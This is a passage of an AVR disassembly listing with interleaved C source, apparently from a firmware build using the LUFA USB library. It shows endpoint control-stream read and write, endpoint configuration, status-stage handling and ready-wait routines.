    67fc:	41 c0       	rjmp	.+130    	; 0x6880 <Endpoint_Write_Control_Stream_LE+0xb8>
    67fe:	85 30       	cpi	r24, 0x05	; 5
    6800:	09 f4       	brne	.+2      	; 0x6804 <Endpoint_Write_Control_Stream_LE+0x3c>
    6802:	40 c0       	rjmp	.+128    	; 0x6884 <Endpoint_Write_Control_Stream_LE+0xbc>
    6804:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6808:	83 fd       	sbrc	r24, 3
    680a:	3e c0       	rjmp	.+124    	; 0x6888 <Endpoint_Write_Control_Stream_LE+0xc0>
    680c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6810:	82 fd       	sbrc	r24, 2
    6812:	30 c0       	rjmp	.+96     	; 0x6874 <Endpoint_Write_Control_Stream_LE+0xac>
    6814:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6818:	80 ff       	sbrs	r24, 0
    681a:	1c c0       	rjmp	.+56     	; 0x6854 <Endpoint_Write_Control_Stream_LE+0x8c>
    681c:	40 91 f2 00 	lds	r20, 0x00F2	; 0x8000f2 <__TEXT_REGION_LENGTH__+0x7e00f2>
    6820:	50 91 f3 00 	lds	r21, 0x00F3	; 0x8000f3 <__TEXT_REGION_LENGTH__+0x7e00f3>
    6824:	07 c0       	rjmp	.+14     	; 0x6834 <Endpoint_Write_Control_Stream_LE+0x6c>
    6826:	81 91       	ld	r24, Z+
    6828:	80 93 f1 00 	sts	0x00F1, r24	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
    682c:	21 50       	subi	r18, 0x01	; 1
    682e:	31 09       	sbc	r19, r1
    6830:	4f 5f       	subi	r20, 0xFF	; 255
    6832:	5f 4f       	sbci	r21, 0xFF	; 255
    6834:	21 15       	cp	r18, r1
    6836:	31 05       	cpc	r19, r1
    6838:	19 f0       	breq	.+6      	; 0x6840 <Endpoint_Write_Control_Stream_LE+0x78>
    683a:	48 30       	cpi	r20, 0x08	; 8
    683c:	51 05       	cpc	r21, r1
    683e:	98 f3       	brcs	.-26     	; 0x6826 <Endpoint_Write_Control_Stream_LE+0x5e>
    6840:	91 e0       	ldi	r25, 0x01	; 1
    6842:	48 30       	cpi	r20, 0x08	; 8
    6844:	51 05       	cpc	r21, r1
    6846:	09 f0       	breq	.+2      	; 0x684a <Endpoint_Write_Control_Stream_LE+0x82>
    6848:	90 e0       	ldi	r25, 0x00	; 0
    684a:	a8 ee       	ldi	r26, 0xE8	; 232
    684c:	b0 e0       	ldi	r27, 0x00	; 0
    684e:	8c 91       	ld	r24, X
    6850:	8e 77       	andi	r24, 0x7E	; 126
    6852:	8c 93       	st	X, r24
    6854:	21 15       	cp	r18, r1
    6856:	31 05       	cpc	r19, r1
    6858:	69 f6       	brne	.-102    	; 0x67f4 <Endpoint_Write_Control_Stream_LE+0x2c>
    685a:	91 11       	cpse	r25, r1
    685c:	cb cf       	rjmp	.-106    	; 0x67f4 <Endpoint_Write_Control_Stream_LE+0x2c>
    685e:	0a c0       	rjmp	.+20     	; 0x6874 <Endpoint_Write_Control_Stream_LE+0xac>
    6860:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    6864:	88 23       	and	r24, r24
    6866:	91 f0       	breq	.+36     	; 0x688c <Endpoint_Write_Control_Stream_LE+0xc4>
    6868:	85 30       	cpi	r24, 0x05	; 5
    686a:	91 f0       	breq	.+36     	; 0x6890 <Endpoint_Write_Control_Stream_LE+0xc8>
    686c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6870:	83 fd       	sbrc	r24, 3
    6872:	10 c0       	rjmp	.+32     	; 0x6894 <Endpoint_Write_Control_Stream_LE+0xcc>
    6874:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
    6878:	82 ff       	sbrs	r24, 2
    687a:	f2 cf       	rjmp	.-28     	; 0x6860 <Endpoint_Write_Control_Stream_LE+0x98>
    687c:	80 e0       	ldi	r24, 0x00	; 0
    687e:	08 95       	ret
    6880:	82 e0       	ldi	r24, 0x02	; 2
    6882:	08 95       	ret
    6884:	83 e0       	ldi	r24, 0x03	; 3
    6886:	08 95       	ret
    6888:	81 e0       	ldi	r24, 0x01	; 1
    688a:	08 95       	ret
    688c:	82 e0       	ldi	r24, 0x02	; 2
    688e:	08 95       	ret
    6890:	83 e0       	ldi	r24, 0x03	; 3
    6892:	08 95       	ret
    6894:	81 e0       	ldi	r24, 0x01	; 1
    6896:	08 95       	ret

00006898 <Endpoint_Read_Control_Stream_LE>:
uint8_t TEMPLATE_FUNC_NAME (void* const Buffer,
                            uint16_t Length)
{
	uint8_t* DataStream = ((uint8_t*)Buffer + TEMPLATE_BUFFER_OFFSET(Length));

	if (!(Length))
    6898:	61 15       	cp	r22, r1
    689a:	71 05       	cpc	r23, r1
    689c:	29 f4       	brne	.+10     	; 0x68a8 <Endpoint_Read_Control_Stream_LE+0x10>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    689e:	e8 ee       	ldi	r30, 0xE8	; 232
    68a0:	f0 e0       	ldi	r31, 0x00	; 0
    68a2:	20 81       	ld	r18, Z
    68a4:	2b 77       	andi	r18, 0x7B	; 123
    68a6:	20 83       	st	Z, r18

#if defined(TEMPLATE_FUNC_NAME)

uint8_t TEMPLATE_FUNC_NAME (void* const Buffer,
                            uint16_t Length)
{
    68a8:	e8 2f       	mov	r30, r24
    68aa:	f9 2f       	mov	r31, r25
    68ac:	22 c0       	rjmp	.+68     	; 0x68f2 <Endpoint_Read_Control_Stream_LE+0x5a>
	if (!(Length))
	  Endpoint_ClearOUT();

	while (Length)
	{
		uint8_t USB_DeviceState_LCL = USB_DeviceState;
    68ae:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
    68b2:	88 23       	and	r24, r24
    68b4:	71 f1       	breq	.+92     	; 0x6912 <Endpoint_Read_Control_Stream_LE+0x7a>
		  return ENDPOINT_RWCSTREAM_DeviceDisconnected;
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
    68b6:	85 30       	cpi	r24, 0x05	; 5
    68b8:	71 f1       	breq	.+92     	; 0x6916 <Endpoint_Read_Control_Stream_LE+0x7e>
			 *  \return Boolean \c true if the selected endpoint has received a SETUP packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsSETUPReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsSETUPReceived(void)
			{
				return ((UEINTX & (1 << RXSTPI)) ? true : false);
    68ba:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
		  return ENDPOINT_RWCSTREAM_BusSuspended;
		else if (Endpoint_IsSETUPReceived())
    68be:	83 fd       	sbrc	r24, 3
    68c0:	2c c0       	rjmp	.+88     	; 0x691a <Endpoint_Read_Control_Stream_LE+0x82>
			 *  \return Boolean \c true if current endpoint is has received an OUT packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsOUTReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsOUTReceived(void)
			{
				return ((UEINTX & (1 << RXOUTI)) ? true : false);
    68c2:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
		  return ENDPOINT_RWCSTREAM_HostAborted;

		if (Endpoint_IsOUTReceived())
    68c6:	82 ff       	sbrs	r24, 2
    68c8:	14 c0       	rjmp	.+40     	; 0x68f2 <Endpoint_Read_Control_Stream_LE+0x5a>
    68ca:	05 c0       	rjmp	.+10     	; 0x68d6 <Endpoint_Read_Control_Stream_LE+0x3e>
			 *  \return Next byte in the currently selected endpoint's FIFO buffer.
			 */
			static inline uint8_t Endpoint_Read_8(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_Read_8(void)
			{
				return UEDATX;
    68cc:	80 91 f1 00 	lds	r24, 0x00F1	; 0x8000f1 <__TEXT_REGION_LENGTH__+0x7e00f1>
		{
			while (Length && Endpoint_BytesInEndpoint())
			{
				TEMPLATE_TRANSFER_BYTE(DataStream);
    68d0:	81 93       	st	Z+, r24
				TEMPLATE_BUFFER_MOVE(DataStream, 1);
				Length--;
    68d2:	61 50       	subi	r22, 0x01	; 1
    68d4:	71 09       	sbc	r23, r1
		else if (Endpoint_IsSETUPReceived())
		  return ENDPOINT_RWCSTREAM_HostAborted;

		if (Endpoint_IsOUTReceived())
		{
			while (Length && Endpoint_BytesInEndpoint())
    68d6:	61 15       	cp	r22, r1
    68d8:	71 05       	cpc	r23, r1
    68da:	31 f0       	breq	.+12     	; 0x68e8 <Endpoint_Read_Control_Stream_LE+0x50>
			 */
			static inline uint16_t Endpoint_BytesInEndpoint(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint16_t Endpoint_BytesInEndpoint(void)
			{
				#if (defined(USB_SERIES_6_AVR) || defined(USB_SERIES_7_AVR))
					return UEBCX;
    68dc:	80 91 f2 00 	lds	r24, 0x00F2	; 0x8000f2 <__TEXT_REGION_LENGTH__+0x7e00f2>
    68e0:	90 91 f3 00 	lds	r25, 0x00F3	; 0x8000f3 <__TEXT_REGION_LENGTH__+0x7e00f3>
    68e4:	89 2b       	or	r24, r25
    68e6:	91 f7       	brne	.-28     	; 0x68cc <Endpoint_Read_Control_Stream_LE+0x34>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    68e8:	a8 ee       	ldi	r26, 0xE8	; 232
    68ea:	b0 e0       	ldi	r27, 0x00	; 0
    68ec:	8c 91       	ld	r24, X
    68ee:	8b 77       	andi	r24, 0x7B	; 123
    68f0:	8c 93       	st	X, r24
	uint8_t* DataStream = ((uint8_t*)Buffer + TEMPLATE_BUFFER_OFFSET(Length));

	if (!(Length))
	  Endpoint_ClearOUT();

	while (Length)
    68f2:	61 15       	cp	r22, r1
    68f4:	71 05       	cpc	r23, r1
    68f6:	d9 f6       	brne	.-74     	; 0x68ae <Endpoint_Read_Control_Stream_LE+0x16>
    68f8:	06 c0       	rjmp	.+12     	; 0x6906 <Endpoint_Read_Control_Stream_LE+0x6e>
		}
	}

	while (!(Endpoint_IsINReady()))
	{
		uint8_t USB_DeviceState_LCL = USB_DeviceState;
    68fa:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
    68fe:	88 23       	and	r24, r24
    6900:	71 f0       	breq	.+28     	; 0x691e <Endpoint_Read_Control_Stream_LE+0x86>
		  return ENDPOINT_RWCSTREAM_DeviceDisconnected;
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
    6902:	85 30       	cpi	r24, 0x05	; 5
    6904:	71 f0       	breq	.+28     	; 0x6922 <Endpoint_Read_Control_Stream_LE+0x8a>
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    6906:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

			Endpoint_ClearOUT();
		}
	}

	while (!(Endpoint_IsINReady()))
    690a:	80 ff       	sbrs	r24, 0
    690c:	f6 cf       	rjmp	.-20     	; 0x68fa <Endpoint_Read_Control_Stream_LE+0x62>
		  return ENDPOINT_RWCSTREAM_DeviceDisconnected;
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
		  return ENDPOINT_RWCSTREAM_BusSuspended;
	}

	return ENDPOINT_RWCSTREAM_NoError;
    690e:	80 e0       	ldi	r24, 0x00	; 0
    6910:	08 95       	ret
	while (Length)
	{
		uint8_t USB_DeviceState_LCL = USB_DeviceState;

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
		  return ENDPOINT_RWCSTREAM_DeviceDisconnected;
    6912:	82 e0       	ldi	r24, 0x02	; 2
    6914:	08 95       	ret
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
		  return ENDPOINT_RWCSTREAM_BusSuspended;
    6916:	83 e0       	ldi	r24, 0x03	; 3
    6918:	08 95       	ret
		else if (Endpoint_IsSETUPReceived())
		  return ENDPOINT_RWCSTREAM_HostAborted;
    691a:	81 e0       	ldi	r24, 0x01	; 1
    691c:	08 95       	ret
	while (!(Endpoint_IsINReady()))
	{
		uint8_t USB_DeviceState_LCL = USB_DeviceState;

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
		  return ENDPOINT_RWCSTREAM_DeviceDisconnected;
    691e:	82 e0       	ldi	r24, 0x02	; 2
    6920:	08 95       	ret
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
		  return ENDPOINT_RWCSTREAM_BusSuspended;
    6922:	83 e0       	ldi	r24, 0x03	; 3
	}

	return ENDPOINT_RWCSTREAM_NoError;
}
    6924:	08 95       	ret

00006926 <Endpoint_ConfigureEndpoint_Prv>:
		UEIENX  = 0;
		UEINTX  = 0;
		UECFG1X = 0;
		Endpoint_DisableEndpoint();
	}
}
    6926:	98 2f       	mov	r25, r24
    6928:	29 c0       	rjmp	.+82     	; 0x697c <Endpoint_ConfigureEndpoint_Prv+0x56>
    692a:	29 2f       	mov	r18, r25
    692c:	2f 70       	andi	r18, 0x0F	; 15
    692e:	20 93 e9 00 	sts	0x00E9, r18	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    6932:	98 17       	cp	r25, r24
    6934:	39 f0       	breq	.+14     	; 0x6944 <Endpoint_ConfigureEndpoint_Prv+0x1e>
    6936:	70 91 ec 00 	lds	r23, 0x00EC	; 0x8000ec <__TEXT_REGION_LENGTH__+0x7e00ec>
    693a:	20 91 ed 00 	lds	r18, 0x00ED	; 0x8000ed <__TEXT_REGION_LENGTH__+0x7e00ed>
    693e:	50 91 f0 00 	lds	r21, 0x00F0	; 0x8000f0 <__TEXT_REGION_LENGTH__+0x7e00f0>
    6942:	03 c0       	rjmp	.+6      	; 0x694a <Endpoint_ConfigureEndpoint_Prv+0x24>
    6944:	24 2f       	mov	r18, r20
    6946:	76 2f       	mov	r23, r22
    6948:	50 e0       	ldi	r21, 0x00	; 0
    694a:	21 ff       	sbrs	r18, 1
    694c:	16 c0       	rjmp	.+44     	; 0x697a <Endpoint_ConfigureEndpoint_Prv+0x54>
    694e:	eb ee       	ldi	r30, 0xEB	; 235
    6950:	f0 e0       	ldi	r31, 0x00	; 0
    6952:	30 81       	ld	r19, Z
    6954:	3e 7f       	andi	r19, 0xFE	; 254
    6956:	30 83       	st	Z, r19
    6958:	ad ee       	ldi	r26, 0xED	; 237
    695a:	b0 e0       	ldi	r27, 0x00	; 0
    695c:	3c 91       	ld	r19, X
    695e:	3d 7f       	andi	r19, 0xFD	; 253
    6960:	3c 93       	st	X, r19
    6962:	30 81       	ld	r19, Z
    6964:	31 60       	ori	r19, 0x01	; 1
    6966:	30 83       	st	Z, r19
    6968:	70 93 ec 00 	sts	0x00EC, r23	; 0x8000ec <__TEXT_REGION_LENGTH__+0x7e00ec>
    696c:	2c 93       	st	X, r18
    696e:	50 93 f0 00 	sts	0x00F0, r21	; 0x8000f0 <__TEXT_REGION_LENGTH__+0x7e00f0>
    6972:	20 91 ee 00 	lds	r18, 0x00EE	; 0x8000ee <__TEXT_REGION_LENGTH__+0x7e00ee>
    6976:	22 23       	and	r18, r18
    6978:	44 f4       	brge	.+16     	; 0x698a <Endpoint_ConfigureEndpoint_Prv+0x64>
    697a:	9f 5f       	subi	r25, 0xFF	; 255
    697c:	97 30       	cpi	r25, 0x07	; 7
    697e:	a8 f2       	brcs	.-86     	; 0x692a <Endpoint_ConfigureEndpoint_Prv+0x4>
    6980:	8f 70       	andi	r24, 0x0F	; 15
    6982:	80 93 e9 00 	sts	0x00E9, r24	; 0x8000e9 <__TEXT_REGION_LENGTH__+0x7e00e9>
    6986:	81 e0       	ldi	r24, 0x01	; 1
    6988:	08 95       	ret
    698a:	80 e0       	ldi	r24, 0x00	; 0
    698c:	08 95       	ret

0000698e <Endpoint_ConfigureEndpointTable>:
    698e:	0f 93       	push	r16
    6990:	1f 93       	push	r17
    6992:	cf 93       	push	r28
    6994:	df 93       	push	r29
    6996:	ec 01       	movw	r28, r24
    6998:	06 2f       	mov	r16, r22
    699a:	10 e0       	ldi	r17, 0x00	; 0
    699c:	36 c0       	rjmp	.+108    	; 0x6a0a <Endpoint_ConfigureEndpointTable+0x7c>
    699e:	e1 2f       	mov	r30, r17
    69a0:	f0 e0       	ldi	r31, 0x00	; 0
    69a2:	cf 01       	movw	r24, r30
    69a4:	88 0f       	add	r24, r24
    69a6:	99 1f       	adc	r25, r25
    69a8:	88 0f       	add	r24, r24
    69aa:	99 1f       	adc	r25, r25
    69ac:	e8 0f       	add	r30, r24
    69ae:	f9 1f       	adc	r31, r25
    69b0:	ec 0f       	add	r30, r28
    69b2:	fd 1f       	adc	r31, r29
    69b4:	50 81       	ld	r21, Z
    69b6:	55 23       	and	r21, r21
    69b8:	39 f1       	breq	.+78     	; 0x6a08 <Endpoint_ConfigureEndpointTable+0x7a>
    69ba:	94 81       	ldd	r25, Z+4	; 0x04
    69bc:	a1 81       	ldd	r26, Z+1	; 0x01
    69be:	b2 81       	ldd	r27, Z+2	; 0x02
    69c0:	63 81       	ldd	r22, Z+3	; 0x03
    69c2:	85 2f       	mov	r24, r21
    69c4:	8f 70       	andi	r24, 0x0F	; 15
    69c6:	87 30       	cpi	r24, 0x07	; 7
    69c8:	e0 f4       	brcc	.+56     	; 0x6a02 <Endpoint_ConfigureEndpointTable+0x74>
    69ca:	92 30       	cpi	r25, 0x02	; 2
    69cc:	10 f0       	brcs	.+4      	; 0x69d2 <Endpoint_ConfigureEndpointTable+0x44>
    69ce:	46 e0       	ldi	r20, 0x06	; 6
    69d0:	01 c0       	rjmp	.+2      	; 0x69d4 <Endpoint_ConfigureEndpointTable+0x46>
    69d2:	42 e0       	ldi	r20, 0x02	; 2
    69d4:	28 e0       	ldi	r18, 0x08	; 8
    69d6:	30 e0       	ldi	r19, 0x00	; 0
    69d8:	90 e0       	ldi	r25, 0x00	; 0
    69da:	03 c0       	rjmp	.+6      	; 0x69e2 <Endpoint_ConfigureEndpointTable+0x54>
    69dc:	9f 5f       	subi	r25, 0xFF	; 255
    69de:	22 0f       	add	r18, r18
    69e0:	33 1f       	adc	r19, r19
    69e2:	2a 17       	cp	r18, r26
    69e4:	3b 07       	cpc	r19, r27
    69e6:	d0 f3       	brcs	.-12     	; 0x69dc <Endpoint_ConfigureEndpointTable+0x4e>
    69e8:	92 95       	swap	r25
    69ea:	90 7f       	andi	r25, 0xF0	; 240
    69ec:	20 e4       	ldi	r18, 0x40	; 64
    69ee:	62 9f       	mul	r22, r18
    69f0:	b0 01       	movw	r22, r0
    69f2:	11 24       	eor	r1, r1
    69f4:	55 1f       	adc	r21, r21
    69f6:	55 27       	eor	r21, r21
    69f8:	55 1f       	adc	r21, r21
    69fa:	49 2b       	or	r20, r25
    69fc:	65 2b       	or	r22, r21
    69fe:	93 df       	rcall	.-218    	; 0x6926 <Endpoint_ConfigureEndpoint_Prv>
    6a00:	01 c0       	rjmp	.+2      	; 0x6a04 <Endpoint_ConfigureEndpointTable+0x76>
    6a02:	80 e0       	ldi	r24, 0x00	; 0
    6a04:	88 23       	and	r24, r24
    6a06:	21 f0       	breq	.+8      	; 0x6a10 <Endpoint_ConfigureEndpointTable+0x82>
    6a08:	1f 5f       	subi	r17, 0xFF	; 255
    6a0a:	10 17       	cp	r17, r16
    6a0c:	40 f2       	brcs	.-112    	; 0x699e <Endpoint_ConfigureEndpointTable+0x10>
    6a0e:	81 e0       	ldi	r24, 0x01	; 1
    6a10:	df 91       	pop	r29
    6a12:	cf 91       	pop	r28
    6a14:	1f 91       	pop	r17
    6a16:	0f 91       	pop	r16
    6a18:	08 95       	ret

00006a1a <Endpoint_ClearStatusStage>:

void Endpoint_ClearStatusStage(void)
{
	if (USB_ControlRequest.bmRequestType & REQDIR_DEVICETOHOST)
    6a1a:	80 91 f4 0d 	lds	r24, 0x0DF4	; 0x800df4 <USB_ControlRequest>
    6a1e:	88 23       	and	r24, r24
    6a20:	9c f4       	brge	.+38     	; 0x6a48 <Endpoint_ClearStatusStage+0x2e>
    6a22:	04 c0       	rjmp	.+8      	; 0x6a2c <Endpoint_ClearStatusStage+0x12>
	{
		while (!(Endpoint_IsOUTReceived()))
		{
			if (USB_DeviceState == DEVICE_STATE_Unattached)
    6a24:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    6a28:	88 23       	and	r24, r24
    6a2a:	b9 f0       	breq	.+46     	; 0x6a5a <Endpoint_ClearStatusStage+0x40>
			 *  \return Boolean \c true if current endpoint is has received an OUT packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsOUTReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsOUTReceived(void)
			{
				return ((UEINTX & (1 << RXOUTI)) ? true : false);
    6a2c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

void Endpoint_ClearStatusStage(void)
{
	if (USB_ControlRequest.bmRequestType & REQDIR_DEVICETOHOST)
	{
		while (!(Endpoint_IsOUTReceived()))
    6a30:	82 ff       	sbrs	r24, 2
    6a32:	f8 cf       	rjmp	.-16     	; 0x6a24 <Endpoint_ClearStatusStage+0xa>
			 */
			static inline void Endpoint_ClearOUT(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearOUT(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << RXOUTI) | (1 << FIFOCON));
    6a34:	e8 ee       	ldi	r30, 0xE8	; 232
    6a36:	f0 e0       	ldi	r31, 0x00	; 0
    6a38:	80 81       	ld	r24, Z
    6a3a:	8b 77       	andi	r24, 0x7B	; 123
    6a3c:	80 83       	st	Z, r24
    6a3e:	08 95       	ret
	}
	else
	{
		while (!(Endpoint_IsINReady()))
		{
			if (USB_DeviceState == DEVICE_STATE_Unattached)
    6a40:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>
    6a44:	88 23       	and	r24, r24
    6a46:	49 f0       	breq	.+18     	; 0x6a5a <Endpoint_ClearStatusStage+0x40>
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    6a48:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>

		Endpoint_ClearOUT();
	}
	else
	{
		while (!(Endpoint_IsINReady()))
    6a4c:	80 ff       	sbrs	r24, 0
    6a4e:	f8 cf       	rjmp	.-16     	; 0x6a40 <Endpoint_ClearStatusStage+0x26>
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    6a50:	e8 ee       	ldi	r30, 0xE8	; 232
    6a52:	f0 e0       	ldi	r31, 0x00	; 0
    6a54:	80 81       	ld	r24, Z
    6a56:	8e 77       	andi	r24, 0x7E	; 126
    6a58:	80 83       	st	Z, r24
    6a5a:	08 95       	ret

00006a5c <Endpoint_WaitUntilReady>:
			 *  \return Current USB frame number from the USB controller.
			 */
			static inline uint16_t USB_Device_GetFrameNumber(void) ATTR_ALWAYS_INLINE ATTR_WARN_UNUSED_RESULT;
			static inline uint16_t USB_Device_GetFrameNumber(void)
			{
				return UDFNUM;
    6a5c:	20 91 e4 00 	lds	r18, 0x00E4	; 0x8000e4 <__TEXT_REGION_LENGTH__+0x7e00e4>
    6a60:	30 91 e5 00 	lds	r19, 0x00E5	; 0x8000e5 <__TEXT_REGION_LENGTH__+0x7e00e5>

#if !defined(CONTROL_ONLY_DEVICE)
uint8_t Endpoint_WaitUntilReady(void)
{
	#if (USB_STREAM_TIMEOUT_MS < 0xFF)
	uint8_t  TimeoutMSRem = USB_STREAM_TIMEOUT_MS;
    6a64:	44 e6       	ldi	r20, 0x64	; 100
    6a66:	02 c0       	rjmp	.+4      	; 0x6a6c <Endpoint_WaitUntilReady+0x10>

		uint16_t CurrentFrameNumber = USB_Device_GetFrameNumber();

		if (CurrentFrameNumber != PreviousFrameNumber)
		{
			PreviousFrameNumber = CurrentFrameNumber;
    6a68:	9c 01       	movw	r18, r24

			if (!(TimeoutMSRem--))
    6a6a:	45 2f       	mov	r20, r21
			 *  \return The currently selected endpoint's direction, as a \c ENDPOINT_DIR_* mask.
			 */
			static inline uint8_t Endpoint_GetEndpointDirection(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline uint8_t Endpoint_GetEndpointDirection(void)
			{
				return (UECFG0X & (1 << EPDIR)) ? ENDPOINT_DIR_IN : ENDPOINT_DIR_OUT;
    6a6c:	80 91 ec 00 	lds	r24, 0x00EC	; 0x8000ec <__TEXT_REGION_LENGTH__+0x7e00ec>
    6a70:	98 2f       	mov	r25, r24
    6a72:	91 70       	andi	r25, 0x01	; 1
    6a74:	80 fd       	sbrc	r24, 0
    6a76:	90 e8       	ldi	r25, 0x80	; 128

	uint16_t PreviousFrameNumber = USB_Device_GetFrameNumber();

	for (;;)
	{
		if (Endpoint_GetEndpointDirection() == ENDPOINT_DIR_IN)
    6a78:	90 38       	cpi	r25, 0x80	; 128
    6a7a:	29 f4       	brne	.+10     	; 0x6a86 <Endpoint_WaitUntilReady+0x2a>
			 *  \return Boolean \c true if the current endpoint is ready for an IN packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsINReady(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsINReady(void)
			{
				return ((UEINTX & (1 << TXINI)) ? true : false);
    6a7c:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
		{
			if (Endpoint_IsINReady())
    6a80:	80 ff       	sbrs	r24, 0
    6a82:	05 c0       	rjmp	.+10     	; 0x6a8e <Endpoint_WaitUntilReady+0x32>
    6a84:	1b c0       	rjmp	.+54     	; 0x6abc <Endpoint_WaitUntilReady+0x60>
			 *  \return Boolean \c true if current endpoint is has received an OUT packet, \c false otherwise.
			 */
			static inline bool Endpoint_IsOUTReceived(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsOUTReceived(void)
			{
				return ((UEINTX & (1 << RXOUTI)) ? true : false);
    6a86:	80 91 e8 00 	lds	r24, 0x00E8	; 0x8000e8 <__TEXT_REGION_LENGTH__+0x7e00e8>
			  return ENDPOINT_READYWAIT_NoError;
		}
		else
		{
			if (Endpoint_IsOUTReceived())
    6a8a:	82 fd       	sbrc	r24, 2
    6a8c:	19 c0       	rjmp	.+50     	; 0x6ac0 <Endpoint_WaitUntilReady+0x64>
			  return ENDPOINT_READYWAIT_NoError;
		}

		uint8_t USB_DeviceState_LCL = USB_DeviceState;
    6a8e:	80 91 f3 0d 	lds	r24, 0x0DF3	; 0x800df3 <USB_DeviceState>

		if (USB_DeviceState_LCL == DEVICE_STATE_Unattached)
    6a92:	88 23       	and	r24, r24
    6a94:	b9 f0       	breq	.+46     	; 0x6ac4 <Endpoint_WaitUntilReady+0x68>
		  return ENDPOINT_READYWAIT_DeviceDisconnected;
		else if (USB_DeviceState_LCL == DEVICE_STATE_Suspended)
    6a96:	85 30       	cpi	r24, 0x05	; 5
    6a98:	b9 f0       	breq	.+46     	; 0x6ac8 <Endpoint_WaitUntilReady+0x6c>
			 *  \return Boolean \c true if the currently selected endpoint is stalled, \c false otherwise.
			 */
			static inline bool Endpoint_IsStalled(void) ATTR_WARN_UNUSED_RESULT ATTR_ALWAYS_INLINE;
			static inline bool Endpoint_IsStalled(void)
			{
				return ((UECONX & (1 << STALLRQ)) ? true : false);
    6a9a:	80 91 eb 00 	lds	r24, 0x00EB	; 0x8000eb <__TEXT_REGION_LENGTH__+0x7e00eb>
		  return ENDPOINT_READYWAIT_BusSuspended;
		else if (Endpoint_IsStalled())
    6a9e:	85 fd       	sbrc	r24, 5
    6aa0:	15 c0       	rjmp	.+42     	; 0x6acc <Endpoint_WaitUntilReady+0x70>
    6aa2:	80 91 e4 00 	lds	r24, 0x00E4	; 0x8000e4 <__TEXT_REGION_LENGTH__+0x7e00e4>
